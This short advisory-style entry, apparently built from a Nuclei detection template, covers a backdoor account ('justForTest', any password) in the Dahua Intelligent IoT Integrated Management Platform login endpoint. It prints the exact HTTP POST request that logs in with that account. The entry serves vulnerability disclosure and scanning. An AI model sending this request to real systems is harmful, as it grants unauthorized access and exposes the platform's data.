# Vulnerability: Dahua Intelligent IoT - Information Disclosure
**Classification:** DAHUA
**Source:** Nuclei Template (`dahua-icc-backdoor-user.yaml`)

## Description
There is a vulnerability in the user login interface /evo-apigw/evo-oauth/oauth/token of Zhejiang Dahua Technology Co., Ltd. Intelligent IoT Integrated Management Platform. Users can successfully log in to the platform using justForTest/any password, causing information leakage.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
```

